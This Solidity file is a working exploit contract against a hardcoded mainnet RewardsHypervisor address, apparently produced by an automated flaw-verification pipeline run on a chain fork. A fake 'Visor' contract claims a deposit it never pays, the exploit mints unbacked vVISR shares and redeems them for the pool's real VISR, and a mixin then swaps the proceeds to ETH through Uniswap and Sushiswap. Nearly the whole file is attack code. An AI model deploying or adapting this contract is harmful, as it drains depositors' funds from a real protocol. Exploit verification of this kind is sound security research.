// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IRewardsHypervisorLike {
    function visr() external view returns (address);
    function vvisr() external view returns (address);
    function deposit(uint256 visrDeposit, address payable from, address to) external returns (uint256 shares);
    function withdraw(uint256 shares, address to, address payable from) external returns (uint256 rewards);
}

interface IVisorLike {
    function owner() external returns (address);
    function delegatedTransferERC20(address token, address to, uint256 amount) external;
}

contract FakeVisor is IVisorLike {
    address internal immutable _owner;

    constructor(address attacker_) {
        _owner = attacker_;
    }

    function owner() external view override returns (address) {
        return _owner;
    }

    function delegatedTransferERC20(address, address, uint256) external pure override {
        // Path stage 1+2: look like an authorized IVisor, but transfer nothing.
        // RewardsHypervisor.deposit() never verifies the VISR balance delta.
    }
}


abstract contract __AHTokenToEthMixin {
    address internal constant AH_WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant AH_USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant AH_USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant AH_DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant AH_UNI_V2 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant AH_SUSHI = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    function _ahFinalizeTokenToEth() internal {
        address token = _ahReadProfitToken();
        if (token == address(0)) return;

        if (token == AH_WETH) {
            _ahTryUnwrapWeth();
            return;
        }

        uint256 bal = _ahBalanceOf(token, address(this));
        if (bal == 0) return;

        _ahTryApprove(token, AH_UNI_V2, bal);
        _ahTrySwapTokenToEth(token, AH_UNI_V2, bal, _ahPath2(token, AH_WETH));
        _ahTrySwapTokenToWeth(token, AH_UNI_V2, _ahBalanceOf(token, address(this)), _ahPath3(token, AH_USDC, AH_WETH));
        _ahTrySwapTokenToWeth(token, AH_UNI_V2, _ahBalanceOf(token, address(this)), _ahPath3(token, AH_USDT, AH_WETH));
        _ahTrySwapTokenToWeth(token, AH_UNI_V2, _ahBalanceOf(token, address(this)), _ahPath3(token, AH_DAI, AH_WETH));

        bal = _ahBalanceOf(token, address(this));
        if (bal > 0) {
            _ahTryApprove(token, AH_SUSHI, bal);
            _ahTrySwapTokenToEth(token, AH_SUSHI, bal, _ahPath2(token, AH_WETH));
            _ahTrySwapTokenToWeth(token, AH_SUSHI, _ahBalanceOf(token, address(this)), _ahPath3(token, AH_USDC, AH_WETH));
            _ahTrySwapTokenToWeth(token, AH_SUSHI, _ahBalanceOf(token, address(this)), _ahPath3(token, AH_USDT, AH_WETH));
            _ahTrySwapTokenToWeth(token, AH_SUSHI, _ahBalanceOf(token, address(this)), _ahPath3(token, AH_DAI, AH_WETH));
        }

        _ahTryUnwrapWeth();
    }

    function _ahReadProfitToken() internal view returns (address token) {
        (bool ok, bytes memory ret) = address(this).staticcall(abi.encodeWithSignature("profitToken()"));
        if (!ok || ret.length < 32) return address(0);
        token = abi.decode(ret, (address));
    }

    function _ahBalanceOf(address token, address account) internal view returns (uint256 bal) {
        if (token == address(0)) return 0;
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IAHERC20.balanceOf.selector, account));
        if (!ok || ret.length < 32) return 0;
        bal = abi.decode(ret, (uint256));
    }

    function _ahTryApprove(address token, address spender, uint256 amount) internal {
        (bool ok,) = token.call(abi.encodeWithSelector(IAHERC20.approve.selector, spender, 0));
        ok;
        (ok,) = token.call(abi.encodeWithSelector(IAHERC20.approve.selector, spender, amount));
        ok;
    }

    function _ahTrySwapTokenToEth(address token, address router, uint256 amountIn, address[] memory path) internal {
        if (amountIn == 0) return;
        (bool ok,) = router.call(
            abi.encodeWithSelector(
                IAHUniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens.selector,
                amountIn,
                0,
                path,
                address(this),
                block.timestamp
            )
        );
        ok;
    }

    function _ahTrySwapTokenToWeth(address token, address router, uint256 amountIn, address[] memory path) internal {
        if (amountIn == 0) return;
        if (path.length < 2 || path[0] != token || path[path.length - 1] != AH_WETH) return;
        (bool ok,) = router.call(
            abi.encodeWithSelector(
                IAHUniV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens.selector,
                amountIn,
                0,
                path,
                address(this),
                block.timestamp
            )
        );
        ok;
    }

    function _ahTryUnwrapWeth() internal {
        uint256 wethBal = _ahBalanceOf(AH_WETH, address(this));
        if (wethBal == 0) return;
        (bool ok,) = AH_WETH.call(abi.encodeWithSelector(IAHWETH.withdraw.selector, wethBal));
        ok;
    }

    function _ahPath2(address a, address b) internal pure returns (address[] memory p) {
        p = new address[](2);
        p[0] = a;
        p[1] = b;
    }

    function _ahPath3(address a, address b, address c) internal pure returns (address[] memory p) {
        p = new address[](3);
        p[0] = a;
        p[1] = b;
        p[2] = c;
    }
}


contract FlawVerifier is __AHTokenToEthMixin {
    address public constant TARGET = 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef;

    uint256 private _profitAmount;
    bool private _executed;

    address public fakeVisor;
    uint256 public visrBalanceBefore;
    uint256 public visrBalanceAfter;
    uint256 public poolVisrBefore;
    uint256 public poolShareSupplyBefore;
    uint256 public claimedDepositAmount;
    uint256 public unbackedSharesMinted;
    uint256 public visrRedeemed;

    constructor() {}

    function executeOnOpportunity() external {
        require(!_executed, "already executed");
        _executed = true;

        IRewardsHypervisorLike hypervisor = IRewardsHypervisorLike(TARGET);
        address visrToken = hypervisor.visr();
        address shareToken = hypervisor.vvisr();

        visrBalanceBefore = IERC20Like(visrToken).balanceOf(address(this));
        poolVisrBefore = IERC20Like(visrToken).balanceOf(TARGET);
        poolShareSupplyBefore = IERC20Like(shareToken).totalSupply();

        // Concrete exploit preconditions derived from F-001.
        require(poolVisrBefore > 0, "infeasible: target holds no VISR");
        require(poolShareSupplyBefore > 0, "infeasible: vVISR supply is zero at fork");

        fakeVisor = address(new FakeVisor(address(this)));

        // Choose the largest non-overflowing `visrDeposit` so the target prices a huge share mint
        // from caller-supplied input alone. This preserves the exact exploit path:
        // 1) deploy fake visor, 2) call deposit(largeAmount, fakeVisor, attacker),
        // 3) receive unbacked vVISR, 4) withdraw those shares for real pooled VISR.
        claimedDepositAmount = (type(uint256).max / poolShareSupplyBefore) - 1;
        require(claimedDepositAmount > poolVisrBefore, "infeasible: safe claimed deposit too small");

        hypervisor.deposit(claimedDepositAmount, payable(fakeVisor), address(this));

        unbackedSharesMinted = IERC20Like(shareToken).balanceOf(address(this));
        require(unbackedSharesMinted > 0, "deposit minted no shares");

        visrRedeemed = hypervisor.withdraw(unbackedSharesMinted, address(this), payable(address(this)));

        visrBalanceAfter = IERC20Like(visrToken).balanceOf(address(this));
        require(visrBalanceAfter > visrBalanceBefore, "exploit not profitable");
        _profitAmount = visrBalanceAfter - visrBalanceBefore;
        _ahFinalizeTokenToEth();
    }

    function profitToken() external view returns (address) {
        return IRewardsHypervisorLike(TARGET).visr();
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }
}

interface IAHERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IAHWETH {
    function withdraw(uint256 amount) external;
}

interface IAHUniV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
